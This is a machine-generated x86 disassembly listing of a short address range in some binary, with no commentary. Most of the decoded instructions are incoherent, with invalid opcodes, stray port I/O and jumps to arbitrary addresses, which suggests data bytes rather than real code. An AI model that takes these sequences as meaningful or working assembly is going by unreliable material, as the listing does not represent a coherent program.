  41da92:	push   esp
  41da93:	call   0xf57c:0x678b0e74
  41da9a:	(bad)  
  41da9d:	jmp    0x41daf0
  41da9f:	cmp    al,0x82
  41daa1:	pop    ds
  41daa2:	test   BYTE PTR [eax],0x0
  41daa5:	add    BYTE PTR [eax],al
  41daa7:	add    BYTE PTR [edi],bl
  41daa9:	add    BYTE PTR [edx+ebp*2+0x6a],0x82
  41daae:	inc    esp
  41daaf:	push   esi
  41dab0:	adc    ebx,DWORD PTR [ebx]
  41dab2:	inc    esp
  41dab3:	mov    edx,DWORD PTR [eax+0x5fa80119]
  41dab9:	je     0x41dac9
  41dabb:	test   DWORD PTR [ecx],ebp
  41dabd:	mov    al,ds:0xe2903d17
  41dac2:	adc    bh,bh
  41dac4:	mov    DWORD PTR [ebp+0x550320e],0x59fa54fd
  41dace:	sbb    BYTE PTR [eax-0x70],al
  41dad1:	(bad)
  41dad6:	mov    edi,eax
  41dad8:	adc    eax,0x1888b719
  41dadd:	push   edi
  41dade:	mov    dh,0x72
  41dae0:	xchg   esp,eax
  41dae1:	or     edx,edx
  41dae3:	call   0x73f98792
  41dae8:	mov    ah,0xd1
  41daea:	mov    dh,0x12
  41daec:	inc    esp
  41daed:	or     al,0x52
  41daef:	add    BYTE PTR [ebx],bl
  41daf1:	inc    edx
  41daf2:	imul   eax,DWORD PTR [ecx*1+0x470e3d45],0x58
  41dafa:	inc    ecx
  41dafb:	or     BYTE PTR [edx+0x6e5d5a99],ah
  41db01:	es pop ecx
  41db03:	ret    0xd98c
  41db06:	fs dec ebx
  41db08:	je     0x41db13
  41db0a:	inc    ecx
  41db0b:	push   esi
  41db0c:	add    BYTE PTR [eax],al
  41db0e:	add    BYTE PTR [eax],al
  41db10:	add    BYTE PTR [esi+0x47],bl
  41db13:	inc    eax
  41db14:	push   esi
  41db15:	inc    esi
  41db16:	dec    esp
  41db17:	aas    
  41db18:	std    
  41db19:	inc    eax
  41db1a:	or     eax,0x64470c6b
  41db1f:	mov    eax,ds:0x42e141fc
  41db24:	std    
  41db25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db26:	sub    eax,0x56904003
  41db2b:	lahf   
  41db2c:	jb     0x41db91
  41db2e:	repnz cmp eax,0xa465a024
  41db34:	xor    BYTE PTR [eax+0x49],dl
  41db37:	inc    edx
  41db38:	push   0xffffff93
  41db3a:	xor    edx,DWORD PTR [ebx]
  41db3c:	push   eax
  41db3d:	shl    BYTE PTR [edx+0x6654fa41],0x13
  41db44:	fmul   DWORD PTR [ebp+eax*8-0x6d]
  41db48:	push   cs
  41db49:	shl    BYTE PTR [edx+0x7608c472],1
  41db4f:	sbb    edx,DWORD PTR [esp+edi*4]
  41db52:	mov    edx,0xefdffc60
  41db57:	push   es
  41db58:	cld    
  41db59:	cmp    BYTE PTR [edi],dl
  41db5b:	outs   dx,DWORD PTR ds:[esi]
  41db5c:	inc    ecx
  41db5d:	mov    BYTE PTR [edx],ah
  41db5f:	neg    DWORD PTR [edx-0x1b50cd0f]
  41db65:	xor    DWORD PTR [ebp+0x6885ad78],0x527e78f0
  41db6f:	xchg   esp,eax
  41db70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db71:	hlt    
  41db72:	xor    dl,BYTE PTR [eax+0x47]
  41db78:	add    BYTE PTR [eax],al
  41db7a:	gs mov dh,0x1d
  41db7d:	jnp    0x41dba5
  41db7f:	repz jo 0x41db47
  41db82:	mov    dl,0xb2
  41db84:	test   DWORD PTR [ebx],0x3f7acd5
  41db8a:	nop
  41db8b:	mov    cl,0xcb
  41db8d:	xchg   ebp,eax
  41db8e:	pop    ebp
  41db8f:	xchg   DWORD PTR [eax],ecx
  41db91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db92:	std    
  41db93:	mov    dh,0xf8
  41db95:	add    edx,DWORD PTR [eax+0x6e5f43d]
  41db9b:	fwait
  41db9c:	cmp    ebp,edx
  41db9e:	lahf   
  41db9f:	mov    esi,0xb2131064
  41dba4:	test   al,0x43
  41dba6:	nop
  41dba7:	stos   DWORD PTR es:[edi],eax
  41dba8:	xor    edx,DWORD PTR es:[ebx+0x7904803f]
  41dbaf:	mov    eax,0x630afa85
  41dbb4:	adc    al,0xeb
  41dbb6:	jl     0x41dc28
  41dbb8:	or     eax,0xeda2ff3
  41dbbd:	loope  0x41db44
  41dbbf:	cmp    edx,DWORD PTR [ebx]
  41dbc1:	fs xchg edx,eax
  41dbc3:	or     DWORD PTR [esi-0x17],0xffffffce
  41dbc7:	mov    ecx,ss
  41dbc9:	cmp    bl,ah
  41dbcb:	sbb    DWORD PTR [ecx+0x21be3045],0x32722ba9
  41dbd5:	ffree  st(5)
  41dbd7:	sub    al,0xf
  41dbd9:	jmp    0x2c5fce71
  41dbde:	add    BYTE PTR [eax],al
  41dbe0:	add    BYTE PTR [eax],al
  41dbe2:	add    ah,bl
  41dbe4:	mov    ds:0x819d16c9,al
  41dbe9:	xor    bh,cl
  41dbeb:	call   0xd128:0x6ba98e4
  41dbf2:	rcr    bh,1
  41dbf4:	lock dec esi
  41dbf6:	cmp    DWORD PTR [edx+esi*4+0x62],edx
  41dbfa:	repnz sub eax,0x5b838ef4
  41dc00:	pusha  
  41dc01:	sti    
  41dc02:	(bad)  
  41dc04:	fimul  DWORD PTR [ebx]
  41dc06:	fisubr WORD PTR [ebp-0xd]
  41dc09:	sbb    eax,0x53f0df9f
  41dc0e:	mov    ecx,0x9f1db253
  41dc13:	(bad)  
  41dc14:	lock push edx
  41dc16:	mov    ecx,0x2874b253
  41dc1b:	in     al,dx
  41dc1c:	mov    ch,0x74
  41dc1e:	bnd jmp 0x41dbdf
  41dc21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc22:	sub    BYTE PTR [ecx+esi*2],ah
  41dc25:	xor    dl,cl
  41dc27:	jge    0x41dc5a
  41dc29:	iret   
  41dc2a:	popf   
  41dc2b:	jge    0x41dc1c
  41dc2d:	(bad)  
  41dc2e:	lds    edx,FWORD PTR [edi+0x3e62bf38]
  41dc34:	aad    0x1d
  41dc36:	jae    0x41dc6e
  41dc38:	out    dx,al
  41dc39:	cdq    
  41dc3a:	add    BYTE PTR ds:0xa70f060d,ah
  41dc40:	dec    ecx
  41dc41:	aas    
  41dc42:	push   ebp
  41dc43:	pop    esi
  41dc44:	mov    ebp,0x143e
  41dc49:	add    BYTE PTR [eax],al
  41dc4b:	add    BYTE PTR [ecx],ch
  41dc4d:	mov    cl,0x91
  41dc4f:	shl    BYTE PTR [ebp-0x649e512],0xf0
  41dc56:	int    0x10
  41dc58:	xor    ah,BYTE PTR [ecx]
  41dc5a:	xchg   edi,eax
  41dc5b:	inc    edi
  41dc5c:	cmp    DWORD PTR [edi],ebx
  41dc5e:	adc    ch,BYTE PTR cs:[ecx+0x79f616a2]
  41dc65:	ror    DWORD PTR [esi-0x139dc48b],0xb8
  41dc6c:	sub    DWORD PTR [eax-0x45afff2],esi
  41dc72:	cwde   
  41dc73:	inc    ecx
  41dc74:	cmc    
  41dc75:	in     eax,0x50
  41dc77:	enter  0xb161,0xed
  41dc7b:	(bad)  
  41dc7c:	jmp    0xe59275ff
  41dc81:	in     eax,0x50
  41dc83:	ret    0x9a79
  41dc86:	xor    ah,BYTE PTR [eax]
  41dc88:	stc    
  41dc89:	jnp    0x41dca6
  41dc8b:	inc    ebp
  41dc8c:	sub    BYTE PTR [esi-0x457a8b15],al
  41dc92:	jmp    0x41dca9
  41dc94:	std    
  41dc95:	mov    esp,0xfe66004e
  41dc9a:	push   es
  41dc9b:	shl    BYTE PTR [esi-0x2],0xf6
  41dc9f:	das    
  41dca0:	xchg   ecx,eax
  41dca1:	jp     0x41dcd5
  41dca3:	sbb    al,0xe5
  41dca5:	or     eax,0x2c51cd97
  41dcaa:	in     al,dx
  41dcab:	jmp    FWORD PTR [esi-0x19]
  41dcae:	mov    ds:0xc8,al
  41dcb3:	add    BYTE PTR [eax],al
  41dcb5:	pop    es
  41dcb6:	ins    BYTE PTR es:[edi],dx
  41dcb7:	aam    0x74
  41dcb9:	xchg   ecx,eax
  41dcba:	imul   edx,DWORD PTR [edx+0x10],0x1252cb90
  41dcc1:	adc    BYTE PTR [esi-0x14],al
  41dcc4:	jle    0x41dd0c
  41dcc6:	ficom  DWORD PTR [ecx]
  41dcc8:	add    BYTE PTR [eax-0x6d97bebd],dh
  41dcce:	ficom  DWORD PTR [ecx]
  41dcd0:	add    BYTE PTR [ebx-0x65],ch
  41dcd3:	loopne 0x41dc94
  41dcd5:	mov    bh,0x73
  41dcd7:	push   ebp
  41dcd8:	pop    ecx
  41dcd9:	jmp    0x3941c6f5
  41dcde:	fcmovb st,st(1)
  41dce0:	(bad)  
  41dce1:	aas    
  41dce2:	repz dec edi
  41dce5:	nop
  41dce6:	fstp   DWORD PTR [ecx+ecx*4+0x3c]
  41dcea:	pop    ecx
  41dceb:	(bad)  
  41dcec:	not    DWORD PTR [ebx]
  41dcee:	mul    ch
  41dcf0:	push   eax
  41dcf1:	or     edi,DWORD PTR [edi+0x1b0b55fe]
  41dcf7:	pop    ebx
  41dcf8:	xchg   DWORD PTR [ebp+esi*8+0x1d],esp
  41dcfc:	xchg   DWORD PTR [ebp+edi*8+0x1],ecx
  41dd00:	sbb    ebx,0xffffffc6
  41dd03:	in     al,dx
  41dd04:	xor    dh,bh
  41dd06:	pusha  
  41dd07:	mov    bl,0xe8
  41dd09:	mov    ds:0x9424255e,eax
  41dd0e:	retf   0x208
  41dd11:	or     edx,DWORD PTR [edx]
  41dd13:	mov    ah,BYTE PTR [esi+0x37]
  41dd16:	ficom  DWORD PTR [ecx]
  41dd18:	add    DWORD PTR [eax],0x0
  41dd1b:	add    BYTE PTR [eax],al
  41dd1d:	add    al,dl
  41dd1f:	push   es
  41dd20:	and    al,0x89
  41dd22:	inc    esp
  41dd23:	mov    ebp,0x7c2b44e6
  41dd28:	push   cs
  41dd29:	mov    edi,eax
  41dd2b:	call   0xffa2:0x65b801b0
  41dd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd33:	push   eax
  41dd34:	mov    eax,ds:0xed26a682
  41dd39:	imul   ebx,DWORD PTR [edx-0x4167304e],0x97dfb437
  41dd43:	sub    DWORD PTR [ebp+0x70c302a4],0xffffffbb
  41dd4a:	je     0x41ddb1
  41dd4c:	jecxz  0x41dcf2
  41dd4e:	loop   0x41dd0a
  41dd50:	in     al,dx
  41dd51:	lods   al,BYTE PTR cs:[esi]
  41dd53:	call   0x77fc:0xebe1530f
  41dd5a:	pop    edi
  41dd5b:	xor    eax,0x37971df5
  41dd60:	mov    esi,0xf7fb1eac
  41dd65:	add    ebp,DWORD PTR [ecx]
  41dd67:	mov    ah,0x72
  41dd69:	mov    edi,0xd75eb0c3
  41dd6e:	sbb    bl,dh
  41dd70:	or     al,0x42
  41dd72:	leave  
  41dd73:	aaa    
  41dd74:	fild   DWORD PTR [ecx+0x52]
  41dd77:	ret    0x8ef7
  41dd7a:	(bad)  
  41dd7b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41dd7d:	(bad)  
  41dd80:	rol    BYTE PTR [ebx],cl
  41dd82:	add    BYTE PTR [eax],al
  41dd84:	add    BYTE PTR [eax],al
  41dd86:	add    BYTE PTR [eax-0x2df10815],dl
  41dd8c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41dd8e:	test   ecx,esi
  41dd90:	mov    cl,0x94
  41dd92:	add    al,0x90
  41dd94:	icebp  
  41dd95:	xchg   esi,eax
  41dd96:	hlt    
  41dd97:	cwde   
  41dd98:	add    DWORD PTR [edi-0x660e6854],esi
  41dd9e:	or     al,0x89
  41dda0:	lock cmp BYTE PTR ds:0xad608561,dh
  41dda7:	sbb    BYTE PTR [eax],cl
  41dda9:	jno    0x41ddfc
  41ddab:	nop
  41ddac:	cmp    DWORD PTR [edi+eiz*8-0x5ce12571],edi
  41ddb3:	lods   al,BYTE PTR ds:[esi]
  41ddb4:	jmp    0x990e:0x6f4248ea
  41ddbb:	xchg   DWORD PTR [ebp-0x4e1ad6df],esi
  41ddc1:	psubsw mm2,QWORD PTR [ebx-0x6a6cba80]
  41ddc8:	sbb    DWORD PTR [ecx-0x1e14f0e4],0x127d0744
  41ddd2:	adc    esp,edi
  41ddd4:	out    0xed,al
  41ddd6:	(bad)  
  41ddd7:	adc    al,0x73
  41ddd9:	adc    ah,BYTE PTR [edx-0x3f]
  41dddc:	mov    edx,0xe7334cf6
  41dde1:	in     eax,dx
  41dde2:	jo     0x41ddba
  41dde4:	mov    edx,0xb6e0961d
  41dde9:	cdq    
  41ddea:	test   al,0x0
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	add    BYTE PTR [eax],al
  41ddf0:	push   esp
  41ddf1:	rcl    BYTE PTR [esi],cl
  41ddf3:	test   al,0xec
  41ddf5:	mov    cl,0xa8
  41ddf7:	(bad)  
  41ddf8:	xchg   ebx,eax
  41ddf9:	mov    dl,0xe
  41ddfb:	or     cl,BYTE PTR [esi-0x45]
  41ddfe:	iret   
  41ddff:	dec    edi
  41de00:	or     eax,0xbade1a73
  41de05:	jl     0x41de05
  41de07:	jno    0x41dddd
  41de09:	sub    bh,dh
  41de0b:	icebp  
  41de0c:	out    dx,al
  41de0d:	repz iret 
  41de0f:	mov    BYTE PTR [ebx+0x507cfbb],cl
  41de15:	jae    0x41de15
  41de17:	cmc    
  41de18:	dec    edx
  41de19:	jl     0x41de1b
  41de1b:	jb     0x41dde9
  41de1d:	sub    bh,dh
  41de1f:	loope  0x41de17
  41de21:	repz iret 
  41de23:	mov    BYTE PTR [ebx+0x1ccfcfbb],cl
  41de29:	jae    0x41de2b
  41de2b:	out    dx,al
  41de2c:	push   0x7c
  41de2e:	add    ah,BYTE PTR [edx-0x2c]
  41de31:	sub    bh,dh
  41de33:	loope  0x41dde3
  41de35:	repz iret 
  41de37:	add    BYTE PTR [eax-0x43],bl
  41de3a:	pop    ss
  41de3b:	ror    edi,0x36
  41de3e:	dec    edi
  41de3f:	adc    al,0xb6
  41de41:	mov    WORD PTR [eax+0x16],ds
  41de44:	xor    ch,dh
  41de46:	lods   al,BYTE PTR ds:[esi]
  41de47:	call   0xc211aecd
  41de4c:	cwde   
  41de4d:	mov    ebp,0x360fc117
  41de52:	dec    edi
  41de53:	push   ss
  41de54:	add    BYTE PTR [eax],al
  41de56:	add    BYTE PTR [eax],al
  41de58:	add    BYTE PTR [esi-0x74],dl
  41de5b:	pop    eax
  41de5c:	sbb    dl,ah
  41de5e:	out    dx,al
  41de5f:	lods   al,BYTE PTR ds:[esi]
  41de60:	call   0xc211aec6
  41de65:	mov    BYTE PTR [ebp+0x360fc117],bh
  41de6b:	dec    edi
  41de6c:	sbb    BYTE PTR [esi-0x76],al
  41de6f:	pop    eax
  41de70:	sbb    al,dl
  41de72:	cmc    
  41de73:	lods   al,BYTE PTR ds:[esi]
  41de74:	call   0xc211acaa
  41de79:	dec    eax
  41de7a:	mov    dh,0x17
  41de7c:	rcr    edi,0x3d
  41de7f:	dec    edi
  41de80:	sbb    dh,BYTE PTR [esi]
  41de82:	mov    bl,BYTE PTR [eax+0x1c]
  41de85:	mov    dl,0xa2
  41de87:	xor    bl,BYTE PTR [eax]
  41de89:	mov    dl,0xf5
  41de8b:	lods   al,BYTE PTR ds:[esi]
  41de8c:	call   0xc211ac92
  41de91:	sbb    BYTE PTR [esi+0x3d8fc117],dh
  41de97:	dec    edi
  41de98:	sbb    al,0x6c
  41de9a:	sbb    DWORD PTR [edx+0x31],esp
  41de9d:	bound  esi,QWORD PTR [edx+0x32]
  41dea0:	sbb    al,0x83
  41dea2:	mov    bh,0x45
  41dea4:	mov    ebx,DWORD PTR [edi+esi*1-0x19]
  41dea8:	repz dec esp
  41deaa:	aaa    
  41deab:	pop    ecx
  41deac:	add    BYTE PTR [ecx+0x26],ah
  41deaf:	in     al,dx
  41deb0:	jmp    DWORD PTR [esi+0x3d]
  41deb3:	jnp    0xe857ed49
  41deb9:	(bad)  
  41deba:	js     0x41de6b
  41debc:	cld    
  41debd:	add    BYTE PTR [eax],al
  41debf:	add    BYTE PTR [eax],al
  41dec1:	add    BYTE PTR [ecx],bl
  41dec3:	sbb    al,0x16
  41dec5:	mov    DWORD PTR [ebp-0x3d],edx
  41dec8:	mov    edx,0xaf9f9ec0
  41decd:	xchg   BYTE PTR [ebx-0x4d],dl
  41ded0:	fwait
  41ded1:	pop    ebx
  41ded2:	mov    ah,0xe9
  41ded4:	dec    esi
  41ded5:	mov    DWORD PTR [ebx+0x28],edx
  41ded8:	sub    eax,0x1a9bd959
  41dedd:	add    BYTE PTR [esi-0x31],bh
  41dee0:	mov    ecx,0x10d9d481
  41dee5:	jae    0x41de8c
  41dee7:	aas    
  41dee8:	jo     0x41df61
  41deea:	adc    dl,BYTE PTR [esi]
  41deec:	adc    dl,BYTE PTR [esi+0x57]
  41deef:	inc    DWORD PTR [ecx+0x71d9d011]
  41def5:	out    0x12,eax
  41def7:	mov    ss,WORD PTR [edx]
  41def9:	test   al,0x91
  41defb:	xchg   BYTE PTR [edi],cl
  41defd:	sub    DWORD PTR [ebp+0x6d],0xd990443b
  41df04:	sbb    eax,0x4cf4dff
  41df09:	addr16 aam 0xd9
  41df0c:	adc    ebp,eax
  41df0e:	lea    esp,ds:0x80904394
  41df14:	dec    ebp
  41df15:	aas    
  41df16:	nop
  41df17:	jnp    0x41ded2
  41df19:	adc    DWORD PTR [ecx+ebx*8+0x27],0xe4319dfd
  41df21:	aas    
  41df22:	nop
  41df23:	(bad)  
  41df24:	sar    esp,cl
  41df26:	add    BYTE PTR [eax],al
  41df28:	add    BYTE PTR [eax],al
  41df2a:	add    BYTE PTR [ebp+ebp*8+0x19],bl
  41df2e:	std    
  41df2f:	fs cmc 
  41df31:	sbb    ebp,edi
  41df33:	popa   
  41df34:	shr    DWORD PTR [esi+0x78b2944e],1
  41df3a:	(bad)  
  41df3b:	fwait
  41df3c:	hlt    
  41df3d:	fild   WORD PTR [ebx]
  41df3f:	cmp    ax,WORD PTR [edi-0x55]
  41df43:	daa    
  41df44:	jbe    0x41df3c
  41df46:	add    esp,DWORD PTR [esi-0x58f3e492]
  41df4c:	arpl   sp,si
  41df4e:	mov    ebp,cs
  41df50:	fidivr DWORD PTR [esi+ecx*8]
  41df53:	xchg   edi,eax
  41df54:	out    0x70,eax
  41df56:	leave  
  41df57:	in     eax,dx
  41df58:	hlt    
  41df59:	sti    
  41df5a:	add    esp,ebx
  41df5c:	cmp    ebx,DWORD PTR [esp+eax*4]
  41df5f:	imul   esi,DWORD PTR [esi-0x7f67b990],0x70
  41df66:	push   ss
  41df67:	cwde   
  41df68:	jg     0x41dfc8
  41df6a:	inc    esi
  41df6b:	push   0xcf97b335
  41df70:	xor    eax,0xe7c7e3bb
  41df75:	(bad)  
  41df76:	call   FWORD PTR [eax]
  41df78:	jmp    0xefd630dd
  41df7d:	xor    bl,BYTE PTR [eax+0x438366f]
  41df83:	minps  xmm3,xmm3
  41df86:	lods   al,BYTE PTR ds:[esi]
  41df87:	and    BYTE PTR [ebx-0x9],al
  41df8a:	add    edx,DWORD PTR [ebx]
  41df8c:	repnz and ebp,edx
  41df8f:	add    BYTE PTR [eax],al
  41df91:	add    BYTE PTR [eax],al
  41df93:	add    BYTE PTR [eax],dl
  41df95:	jmp    0xa1b8:0x337417f6
  41df9c:	adc    dl,ch
  41df9e:	not    BYTE PTR [esi]
  41dfa0:	xchg   ebp,eax
  41dfa1:	pop    esp
  41dfa2:	mov    WORD PTR [edx],gs
  41dfa4:	nop
  41dfa5:	xor    eax,0x8046e333
  41dfaa:	pushf  
  41dfab:	aaa    
  41dfac:	push   eax
  41dfad:	xor    edi,DWORD PTR [esp+esi*8-0x549305f0]
  41dfb4:	mov    edi,DWORD PTR [ebx]
  41dfb6:	mov    esp,tr3
  41dfb9:	cmp    DWORD PTR [ebp+edx*8-0x64],edx
  41dfbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfbe:	(bad)  
  41dfbf:	jno    0x41e01a
  41dfc1:	xchg   edx,eax
  41dfc2:	dec    ebp
  41dfc3:	mov    edi,0xe90af0cc
  41dfc8:	js     0x41e003
  41dfca:	sti    
  41dfcb:	mov    eax,0xcd0c3962
  41dfd0:	jp     0x41e040
  41dfd2:	push   cs
  41dfd3:	xchg   edi,eax
  41dfd4:	or     ah,BYTE PTR [esi+edx*1-0x62]
  41dfd8:	or     ch,bl
  41dfda:	bound  edx,QWORD PTR [ebx+edi*1-0x6c166c18]
  41dfe1:	cs iret 
  41dfe3:	xchg   ebp,eax
  41dfe4:	iret   
  41dfe5:	pop    eax
  41dfe6:	jae    0xeaba5c78
  41dfec:	sbb    bh,bl
  41dfee:	test   ch,0xd7
  41dff1:	in     eax,0xed
  41dff3:	(bad)  
  41dff4:	js     0x41dfb8
  41dff6:	cdq    
  41dff7:	icebp  
  41dff8:	add    BYTE PTR [eax],al
  41dffa:	add    BYTE PTR [eax],al
  41dffc:	add    dh,dh
  41dffe:	pusha  
  41dfff:	sbb    ah,BYTE PTR [edi+ebp*1+0x61]
  41e003:	sbb    DWORD PTR [edi],edi
  41e005:	daa    
  41e006:	add    DWORD PTR [edx],0x99ba576a
  41e00c:	fldl2e 
  41e00e:	(bad)  
  41e00f:	in     eax,dx
  41e010:	push   esp
  41e011:	sub    BYTE PTR [ecx],bh
  41e013:	xchg   esi,eax
  41e014:	cdq    
  41e015:	xchg   ebx,eax
  41e016:	mov    dl,0xe
  41e018:	push   ebx
  41e019:	xchg   ebp,eax
  41e01a:	jg     0x41e05a
  41e01c:	pop    ds
  41e01d:	or     edi,ebx
  41e01f:	imul   BYTE PTR [ebx]
  41e021:	das    
  41e022:	out    0xed,eax
  41e024:	jb     0x41dffc
  41e026:	cmp    bl,bh
  41e028:	xchg   ecx,eax
  41e029:	jl     0x41e0a6
  41e02b:	push   cs
  41e02c:	jmp    0xe9d67e5c
  41e031:	xchg   ebx,eax
  41e032:	cmp    edx,ebp
  41e034:	add    BYTE PTR [edx],al
  41e036:	ret    
  41e037:	jmp    0x41e0ae
  41e039:	mov    ecx,0x770c6144
  41e03e:	inc    ebp
  41e03f:	inc    ecx
  41e040:	adc    al,0x3a
  41e042:	in     eax,dx
  41e043:	sbb    DWORD PTR [edi-0x31],ebx
  41e046:	test   al,0xd5
  41e048:	ret    0xb1b9
  41e04b:	inc    ecx
  41e04c:	mov    ecx,DWORD PTR [ebp-0x62]
  41e04f:	aas    
  41e050:	mov    edi,DWORD PTR [ebp+ecx*4-0x6046bb89]
  41e057:	xchg   edi,eax
  41e058:	jne    0x41dffb
  41e05a:	pushf  
  41e05b:	xchg   ecx,eax
  41e05c:	not    ch
  41e05e:	stos   BYTE PTR es:[edi],al
  41e05f:	test   BYTE PTR [ecx+0x0],0x0
  41e066:	hlt    
  41e067:	mov    cl,0xe
  41e069:	test   BYTE PTR [ecx+0x686a5abd],bh
  41e06f:	fwait
  41e070:	in     eax,dx
  41e071:	push   ebp
  41e072:	adc    esi,DWORD PTR [eax+0x4c91cb97]
  41e078:	push   esi
  41e079:	add    DWORD PTR [ecx+0x44],edi
  41e07c:	popa   
  41e07d:	adc    dl,ah
  41e07f:	dec    ecx
  41e080:	jmp    0x41e0f7
  41e082:	ins    DWORD PTR es:[edi],dx
  41e083:	cmp    ch,bl
  41e085:	jne    0x41e0b9
  41e087:	lahf   
  41e088:	jmp    0x41e0df
  41e08a:	inc    ebp
  41e08b:	xor    dl,dl
  41e08d:	or     al,0xc2
  41e08f:	neg    DWORD PTR ds:[esi]
  41e092:	pop    esi
  41e093:	mov    ebp,0x2eb68d02
  41e098:	in     eax,dx
  41e099:	(bad)  
  41e09a:	cmp    DWORD PTR [ebx-0x6386a8f0],ebx
  41e0a0:	xchg   edi,eax
  41e0a1:	retf   
  41e0a2:	push   ecx
  41e0a3:	in     eax,dx
  41e0a4:	jmp    0x41e0a5
  41e0a6:	ds cmp ebx,ebx
  41e0a9:	mov    ebp,DWORD PTR [ecx]
  41e0ab:	push   ss
  41e0ac:	or     cl,BYTE PTR [edx-0x17]
  41e0af:	mov    al,0xf6
  41e0b1:	mov    ebx,0x125690
  41e0b6:	sbb    ecx,DWORD PTR ds:0xe5e70ab8
  41e0bc:	loope  0x41e0ba
  41e0be:	xlat   BYTE PTR gs:[ebx]
  41e0c0:	and    edi,ebp
  41e0c2:	cmp    eax,0x9cc38f07
  41e0c7:	mov    ah,0x2c
  41e0c9:	pop    ecx
  41e0ca:	add    BYTE PTR [eax],al
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    cl,bl
  41e0d0:	cwde   
  41e0d1:	loop   0x41e0d2
  41e0d3:	fs pusha 
  41e0d5:	sahf   
  41e0d6:	dec    esi
  41e0d7:	pop    esi
  41e0d8:	push   eax
  41e0d9:	lds    esp,FWORD PTR [ebx+0x3b]
  41e0dc:	movhlps xmm5,xmm0
  41e0df:	xchg   ebp,eax
  41e0e0:	push   esi
  41e0e1:	adc    al,BYTE PTR [eax]
  41e0e3:	adc    al,0x9b
  41e0e5:	push   es
  41e0e6:	seta   BYTE PTR ds:0xf05e891a
  41e0ed:	push   cs
  41e0ee:	call   0x53023d
  41e0f3:	push   0x77ff9544
  41e0f8:	mov    ebp,0x1f6f0805
  41e0fd:	push   ds
  41e0fe:	push   edi
  41e0ff:	(bad)  
  41e100:	mov    ds:0x7a9007d0,al
  41e105:	ss imul ecx,esp,0x806f8ad9
  41e10c:	aam    0x5
  41e10e:	and    al,0xa0
  41e110:	int3   
  41e111:	add    eax,0x604a024
  41e116:	and    al,0xa0
  41e118:	icebp  
  41e119:	dec    ebp
  41e11a:	std    
  41e11b:	das    
  41e11c:	cmc    
  41e11d:	into   
  41e11e:	sahf   
  41e11f:	lods   al,BYTE PTR ds:[esi]
  41e120:	adc    BYTE PTR [esi+0x0],0x1f
  41e124:	stos   BYTE PTR es:[edi],al
  41e125:	(bad)  
  41e126:	cld    
  41e127:	pushf  
  41e128:	mov    ch,0xe2
  41e12a:	cld    
  41e12b:	test   BYTE PTR [ebp-0x4d83031e],ch
  41e131:	fcomi  st,st(3)
  41e133:	add    BYTE PTR [eax],al
  41e135:	add    BYTE PTR [eax],al
  41e137:	add    bh,dh
  41e139:	adc    BYTE PTR [esi+0x56eff49c],cl
  41e13f:	daa    
  41e140:	jns    0x41e1b0
  41e142:	neg    DWORD PTR [edi+esi*2-0x4be86b56]
  41e149:	ret    0x176c
  41e14c:	lods   al,BYTE PTR ds:[esi]
  41e14d:	ret    0x1764
  41e150:	je     0x41e114
  41e152:	pop    DWORD PTR [esi]
  41e154:	(bad)
  41e157:	rcr    BYTE PTR [esi],0x4f
  41e15a:	rol    BYTE PTR [edi-0x70],0xe3
  41e15e:	(bad)  
  41e15f:	fild   QWORD PTR [esi+ebx*2+0x5ea4f413]
  41e166:	sbb    esi,esp
  41e168:	pushf  
  41e169:	pop    esi
  41e16a:	adc    esi,esp
  41e16c:	scas   eax,DWORD PTR es:[edi]
  41e16d:	xlat   BYTE PTR ds:[ebx]
  41e16e:	and    eax,0x96ef8c9c
  41e173:	daa    
  41e174:	stc    
  41e175:	outs   dx,BYTE PTR ds:[esi]
  41e176:	neg    DWORD PTR [edi+ebp*8-0x53e8f386]
  41e17d:	mov    edx,0xe36d350f
  41e182:	sbb    al,0xc0
  41e184:	push   es
  41e185:	dec    esi
  41e186:	add    BYTE PTR [edi-0x70],0xe3
  41e18a:	addr16 dec edi
  41e18c:	push   ebp
  41e18d:	pop    esi
  41e18e:	fisttp DWORD PTR [ebx]
  41e190:	cmp    BYTE PTR [esi-0x4],ch
  41e193:	fwait
  41e194:	inc    esp
  41e195:	out    dx,eax
  41e196:	sub    cl,BYTE PTR [edi+0x28dc2f2b]
  41e19c:	add    BYTE PTR [eax],al
  41e19e:	add    BYTE PTR [eax],al
  41e1a0:	add    cl,ah
  41e1a2:	jl     0x41e1d0
  41e1a4:	(bad)  
  41e1a5:	fisub  DWORD PTR es:[eax]
  41e1a8:	cdq    
  41e1a9:	and    al,0xe3
  41e1ab:	jp     0x41e148
  41e1ad:	mov    WORD PTR [esi],gs
  41e1af:	sbb    al,BYTE PTR ds:0x640eb290
  41e1b5:	shr    esi,0xa7
  41e1b8:	mov    bh,0x8c
  41e1ba:	mov    dl,0xe
  41e1bc:	xchg   ecx,eax
  41e1bd:	hlt    
  41e1be:	fisttp QWORD PTR [esi]
  41e1c0:	jmp    0x3c461cd
  41e1c5:	loop   0x41e242
  41e1c7:	div    ah
  41e1c9:	add    ah,bl
  41e1cb:	in     eax,dx
  41e1cc:	push   0xffffffb1
  41e1ce:	fimul  WORD PTR [esi]
  41e1d0:	ins    BYTE PTR es:[edi],dx
  41e1d1:	push   ecx
  41e1d2:	ds pushf 
  41e1d4:	and    al,0xfc
  41e1d6:	in     al,dx
  41e1d7:	push   ebx
  41e1d8:	or     DWORD PTR [ebp-0x3caaac13],0x4e9ede2
  41e1e2:	jo     0x41e1c2
  41e1e4:	inc    ecx
  41e1e5:	shr    BYTE PTR [esi-0x2ce916f2],1
  41e1eb:	xchg   ebx,eax
  41e1ec:	aas    
  41e1ed:	mov    ebp,DWORD PTR [esi]
  41e1ef:	retf   0x93e9
  41e1f2:	mov    dl,0x3f
  41e1f4:	lahf   
  41e1f5:	sbb    BYTE PTR [ebp-0x2e],dh
  41e1f8:	cdq    
  41e1f9:	push   ss
  41e1fa:	out    dx,eax
  41e1fb:	test   BYTE PTR [ebx],0x6
  41e1fe:	loop   0x41e1ed
  41e200:	fs dec esp
  41e202:	gs sbb al,0x64
  41e205:	add    BYTE PTR [eax],al
